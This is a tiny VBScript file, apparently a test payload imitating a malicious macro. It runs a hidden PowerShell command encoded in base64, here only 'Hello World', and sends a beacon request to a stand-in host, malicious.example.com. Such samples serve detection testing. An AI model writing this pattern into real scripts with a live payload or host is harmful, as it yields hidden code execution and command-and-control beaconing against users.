' test_payloads/malicious_macro.vbs
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c powershell -enc SGVsbG8gV29ybGQ=", 0, True
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.open "GET", "http://malicious.example.com/beacon", False
objHTTP.send
